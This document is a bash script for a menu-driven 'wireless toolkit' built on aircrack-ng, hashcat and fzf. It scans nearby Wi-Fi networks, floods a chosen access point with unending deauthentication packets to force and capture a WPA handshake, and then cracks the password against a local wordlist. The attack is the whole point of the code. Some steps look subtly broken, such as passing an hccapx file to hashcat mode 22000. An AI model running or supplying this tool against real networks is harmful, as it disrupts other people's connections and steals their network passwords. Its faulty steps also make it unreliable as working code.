#!/bin/bash

# Global variables
INTERFACE=""
MON_IFACE=""
HANDSHAKE_FILE=""
SCAN_FILE="scan_results.csv"
WORDLIST=""
CRACK_TOOL=""

# Main menu
main_menu() {
    while true; do
        choice=$(printf '%s\n' \
            "Select Wireless Interface" \
            "About" \
            "Credit" \
            "Exit" | fzf --prompt="Main Menu > " --header="Wireless Toolkit" --height=40% --reverse)
        
        case "$choice" in
            "Select Wireless Interface") select_interface ;;
            "About") show_about ;;
            "Credit") show_credit ;;
            "Exit") exit 0 ;;
        esac
    done
}

# Interface selection
select_interface() {
    clear
    interfaces=($(airmon-ng | awk '/^ /{print $2}'))
    [ ${#interfaces[@]} -eq 0 ] && echo "No interfaces found!" && return
    
    INTERFACE=$(printf '%s\n' "${interfaces[@]}" | fzf --prompt="Select interface > " --header="Available Interfaces")
    [ -z "$INTERFACE" ] && return
    
    enable_monitor_mode
    operation_menu
}

# Enable monitor mode
enable_monitor_mode() {
    airmon-ng check kill &>/dev/null
    airmon-ng start "$INTERFACE" &>/dev/null
    MON_IFACE="${INTERFACE}mon"
    echo "Interface $MON_IFACE in monitor mode"
}

# Operation menu
operation_menu() {
    choice=$(printf '%s\n' \
        "Attack Mode (Deauth + Handshake Capture)" \
        "Sniffing Mode (Passive Scanning)" \
        "Back to Main Menu" | fzf --prompt="Operation Mode > " --header="Select Operation" --height=40%)
    
    case "$choice" in
        "Attack Mode (Deauth + Handshake Capture)") attack_mode ;;
        "Sniffing Mode (Passive Scanning)") sniffing_mode ;;
        "Back to Main Menu") main_menu ;;
    esac
}

# Attack mode
attack_mode() {
    start_scan
    target_selection
    capture_handshake
    if [ $? -eq 0 ]; then
        select_wordlist
        select_crack_tool
        start_cracking
    else
        echo "Handshake capture failed!"
        sleep 2
    fi
    cleanup
}

# Sniffing mode
sniffing_mode() {
    start_scan
    echo "Scan results saved to $SCAN_FILE"
    echo "Press Enter to return"
    read -r
    cleanup
}

# Start scanning networks
start_scan() {
    timeout 20s airodump-ng -w scan --output-format csv "$MON_IFACE" &>/dev/null
    sed -i '/^Station MAC/,$d' scan-01.csv
    mv scan-01.csv "$SCAN_FILE"
}

# Target selection
target_selection() {
    target=$(awk -F',' 'NR>5 && length($1) == 17 {print $1","$4","$6}' "$SCAN_FILE" | 
        fzf --prompt="Select target > " --header="BSSID,Channel,ESSID" --delimiter=',')
    
    BSSID=$(echo "$target" | cut -d',' -f1)
    CHANNEL=$(echo "$target" | cut -d',' -f2 | xargs)
    ESSID=$(echo "$target" | cut -d',' -f3)
}

# Handshake capture
capture_handshake() {
    airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w handshake "$MON_IFACE" &>/dev/null &
    AIRODUMP_PID=$!
    
    aireplay-ng --deauth 0 -a "$BSSID" "$MON_IFACE" &>/dev/null &
    AIREPLAY_PID=$!
    
    echo -e "Deauth attack running...\nPress Enter to stop and check handshake"
    read -r
    
    kill $AIRODUMP_PID $AIREPLAY_PID
    
    if aircrack-ng handshake-01.cap | grep -q "1 handshake"; then
        HANDSHAKE_FILE="handshake-01.cap"
        return 0
    else
        rm -f handshake-01.*
        return 1
    fi
}

# Wordlist selection
select_wordlist() {
    WORDLIST=$(find ~/ -type f \( -name "*.txt" -o -name "*.lst" \) 2>/dev/null |
        fzf --height 80% --reverse --prompt "Select wordlist > " \
        --preview "head -n 25 {} 2>/dev/null || echo 'Preview not available'")
}

# Cracking tool selection
select_crack_tool() {
    CRACK_TOOL=$(printf '%s\n' "aircrack-ng (CPU)" "hashcat (GPU)" | 
        fzf --prompt="Select cracking tool > " --header="Cracking Method")
}

# Start cracking
start_cracking() {
    case "$CRACK_TOOL" in
        "aircrack-ng (CPU)")
            xterm -e "aircrack-ng -w '$WORDLIST' '$HANDSHAKE_FILE'; read -p 'Press Enter to close...'" &
            ;;
        "hashcat (GPU)")
            hc_file="${HANDSHAKE_FILE%.cap}.hccapx"
            aircrack-ng "$HANDSHAKE_FILE" -J "$hc_file" &>/dev/null
            xterm -e "hashcat -m 22000 '$hc_file' '$WORDLIST'; read -p 'Press Enter to close...'" &
            ;;
    esac
}

# Information screens
show_about() {
    clear
    echo "About Wireless Toolkit"
    echo "----------------------"
    echo "A comprehensive tool for wireless network auditing"
    echo "Features:"
    echo "- Interface monitoring"
    echo "- Handshake capture"
    echo "- Password cracking"
    echo "- Network analysis"
    echo "Press Enter to return"
    read -r
}

show_credit() {
    clear
    echo "Credits"
    echo "-------"
    echo "- Aircrack-ng Team"
    echo "- Hashcat Team"
    echo "- FZF Developers"
    echo "- Linux Wireless Community"
    echo "Press Enter to return"
    read -r
}

# Cleanup
cleanup() {
    airmon-ng stop "$MON_IFACE" &>/dev/null
    rm -f scan-*.csv handshake-*.* *.hccapx &>/dev/null
}

# Main execution
trap cleanup EXIT
main_menu
